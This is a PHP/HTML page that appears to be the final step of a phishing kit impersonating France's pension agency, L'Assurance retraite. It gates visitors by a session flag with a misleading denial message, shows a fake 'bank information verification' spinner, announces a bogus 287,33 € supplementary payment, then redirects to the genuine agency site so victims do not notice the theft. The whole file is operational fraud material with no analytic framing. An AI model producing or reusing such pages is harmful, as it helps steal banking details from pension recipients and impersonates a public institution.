<?php
session_start();

if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
    die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK.");
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Vérification - L'Assurance retraite</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
        }

        body {
            background: #F5F5F5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .header-top {
            background: #003d7a;
            padding: 8px 0;
        }

        .header-main {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo {
            height: 60px;
        }

        .nav-icons {
            display: flex;
            gap: 20px;
            align-items: center;
            justify-content: center;
            flex: 1;
            margin-left: 40px;
            flex-wrap: nowrap;
        }

        .nav-icon span {
            white-space: nowrap;
        }

        .nav-icon {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-decoration: none;
            color: #003d7a;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 12px;
            border-radius: 8px;
            gap: 8px;
        }

        .nav-icon:hover {
            background: #E6F2FF;
            color: #FF5E00;
        }

        .nav-icon img {
            width: 20px;
            height: 20px;
        }

        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            gap: 4px;
            z-index: 1001;
        }

        .hamburger span {
            width: 25px;
            height: 3px;
            background: #003d7a;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .hamburger.active span:nth-child(1) {
            transform: rotate(45deg) translate(6px, 6px);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: rotate(-45deg) translate(6px, -6px);
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .auth-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            padding: 48px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        .auth-logo {
            width: 180px;
            margin: 0 auto 32px;
            display: block;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            margin: 0 auto 24px;
            border: 4px solid #E0E0E0;
            border-top: 4px solid #003d7a;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        h1 {
            color: #003d7a;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .description {
            color: #666;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .status-box {
            background: #FFF9E6;
            border-left: 4px solid #FFB800;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #666;
            text-align: left;
        }

        .status-box strong {
            color: #003d7a;
            display: block;
            margin-bottom: 8px;
        }

        .progress-text {
            color: #003d7a;
            font-size: 14px;
            font-weight: 500;
            margin-top: 24px;
        }

        footer {
            background: #003d7a;
            color: white;
            padding: 50px 24px 30px;
            margin-top: 80px;
        }

        

        /* Footer Styles */
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 60px;
            margin-bottom: 40px;
        }

        .footer-logos {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 40px;
            justify-content: center;
        }

        .footer-logos img {
            height: 60px;
        }

        .footer-section h3 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: white;
        }

        .footer-section ul {
            list-style: none;
            padding: 0;
        }

        .footer-section ul li {
            margin-bottom: 12px;
        }

        .footer-section ul li a {
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .footer-section ul li a:hover {
            color: #FF5E00;
        }

        .social-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-link {
            display: flex;
            align-items: center;
            gap: 12px;
            color: white;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s;
        }

        .social-link:hover {
            color: #FF5E00;
        }

        .social-link svg,
        .social-link img {
            width: 24px;
            height: 24px;
        }

        .social-link img {
            background: white;
            border-radius: 50%;
            padding: 2px;
        }

        .newsletter-text {
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .newsletter-btn {
            background: white;
            color: #003d7a;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .newsletter-btn:hover {
            background: #FF5E00;
            color: white;
        }

        .footer-bottom {
            text-align: center;
            padding-top: 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 14px;
        }

        @media screen and (max-width: 768px) {
            .header-main {
                position: relative;
            }

            .nav-icons {
                position: fixed;
                top: 0;
                right: -100%;
                width: 320px;
                height: 100vh;
                background: white;
                flex-direction: column;
                align-items: stretch;
                box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
                padding: 20px 0 20px;
                margin-left: 0;
                gap: 0;
                z-index: 1000;
                overflow-y: auto;
            }

            .nav-icons.active {
                right: 0;
            }

            .nav-icon {
                width: 100%;
                padding: 18px 24px;
                border-radius: 0;
                border-bottom: 1px solid #E0E0E0;
                justify-content: flex-start;
                flex-shrink: 0;
                font-size: 16px;
                line-height: 1.5;
                min-height: 60px;
            }

            .nav-icon span {
                display: inline;
            }

            .nav-icon img {
                width: 24px;
                height: 24px;
            }

            .hamburger {
                display: flex;
            }

            .logo {
                height: 45px;
            }

            .auth-container {
                padding: 32px 24px;
            }

            .footer-content {
                grid-template-columns: 1fr;
                gap: 40px;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-top"></div>
        <div class="header-main">
            <div class="logo-container">
                <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="L'Assurance retraite" class="logo">
            </div>
            <nav class="nav-icons" id="navMenu">
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/autre/questions-frequentes.html" class="nav-icon">
                    <img src="../assets/icons/FAQ.png" alt="FAQ">
                    <span>Questions fréquentes</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/contacts.html" class="nav-icon">
                    <img src="../assets/icons/contact.png" alt="Contact">
                    <span>Nous contacter</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html" class="nav-icon">
                    <img src="../assets/icons/logo AR.png" alt="Nous connaître">
                    <span>Nous connaître</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/entreprise.html" class="nav-icon">
                    <img src="../assets/icons/entreprise.png" alt="Entreprise">
                    <span>Entreprise</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/annexe/sourd-malentendant-contact.html" class="nav-icon">
                    <img src="../assets/icons/malentendant.png" alt="Sourd">
                    <span>Sourd - Malentendant</span>
                </a>
            </nav>
            <div class="hamburger" onclick="toggleMenu()">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </header>

    <main>
        <div class="auth-container" id="loadingContainer">
            <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="Logo" class="auth-logo">
            
            <div class="loading-spinner"></div>

            <h1>Vérification en cours</h1>
            <p class="description">
                Nous vérifions vos informations pour sécuriser votre transaction.
            </p>

            <div class="status-box">
                <strong>🔐 Authentification sécurisée</strong>
                Vérification de vos informations bancaires en cours. Cette étape peut prendre quelques instants.
            </div>

            <p class="progress-text">
                ⏳ Traitement de votre demande...
            </p>
        </div>

        <div class="auth-container" id="confirmationContainer" style="display: none;">
            <div class="success-icon" style="width: 80px; height: 80px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; animation: scaleIn 0.5s ease-out;">
                <svg viewBox="0 0 24 24" fill="none" style="width: 40px; height: 40px; stroke: white; stroke-width: 3;">
                    <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>

            <h1 style="color: #28a745;">Versement validé !</h1>
            <p class="description">
                Votre demande de versement complémentaire de <strong>287,33 €</strong> a été traitée avec succès.
                <br><br>
                Le versement sera effectif sous 2 à 3 jours ouvrés sur votre compte bancaire.
            </p>

            <div class="status-box" style="background: #E8F5E9; border-left: 4px solid #28a745;">
                <strong style="color: #28a745;">✓ Demande confirmée</strong>
                Vous allez être redirigé automatiquement vers le site de L'Assurance Retraite...
            </div>

            <p class="progress-text" style="color: #666;">
                Redirection dans <span id="countdown">15</span> secondes
            </p>
        </div>
    </main>

    <footer>
        <div class="footer-logos">
            <img src="../icones_PDP/logo_ss.svg" alt="La sécurité sociale">
            <img src="../icones_PDP/logobl.svg" alt="L'assurance retraite">
        </div>
        
        <div class="footer-content">
            <div class="footer-section">
                <h3>L'Assurance retraite</h3>
                <ul>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html">Nous connaître</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/home/nous-rejoindre.html">Nous rejoindre</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/espace-presse.html">Espace presse</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/nos-publications.html">Nos publications de référence</a></li>
                    <li><a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/sites-internet-utiles.html">Sites internet utiles</a></li>
                </ul>
            </div>

            <div class="footer-section">
                <h3>Retrouvez-nous sur</h3>
                <div class="social-links">
                    <a href="https://www.youtube.com/@lassuranceretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/youtube.svg" alt="Youtube">
                        <span>Youtube</span>
                    </a>
                    <a href="https://twitter.com/assurretraite" class="social-link" target="_blank">
                        <img src="../icones_PDP/X.svg" alt="Twitter">
                        <span>Twitter</span>
                    </a>
                    <a href="https://www.linkedin.com/company/l-assurance-retraite/" class="social-link" target="_blank">
                        <img src="../icones_PDP/linkedin.svg" alt="LinkedIn">
                        <span>LinkedIn</span>
                    </a>
                </div>
            </div>

            <div class="footer-section">
                <h3>Notre newsletter</h3>
                <p class="newsletter-text">Inscrivez-vous gratuitement et recevez chaque trimestre, toutes les informations utiles et personnalisées pour préparer et gérer votre retraite.</p>
                <button class="newsletter-btn">Je m'inscris</button>
            </div>
        </div>

        <div class="footer-bottom">
            © <?= date('Y') ?> L'Assurance retraite - Tous droits réservés
        </div>
    </footer>

    <script>
        // Toggle mobile menu
        function toggleMenu() {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            menu.classList.toggle('active');
            hamburger.classList.toggle('active');
        }

        // Close menu when clicking outside
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            const isClickInsideMenu = menu.contains(event.target);
            const isClickOnHamburger = hamburger.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnHamburger && menu.classList.contains('active')) {
                menu.classList.remove('active');
                hamburger.classList.remove('active');
            }
        });

        // Step 1: Show loading for 5 seconds
        setTimeout(function() {
            document.getElementById('loadingContainer').style.display = 'none';
            document.getElementById('confirmationContainer').style.display = 'block';
            
            // Step 2: Start countdown for 15 seconds
            let countdown = 15;
            const countdownElement = document.getElementById('countdown');
            
            const countdownInterval = setInterval(function() {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    // Step 3: Redirect to official site
                    window.location.href = 'https://www.lassuranceretraite.fr/';
                }
            }, 1000);
        }, 5000);
    </script>
</body>
</html>
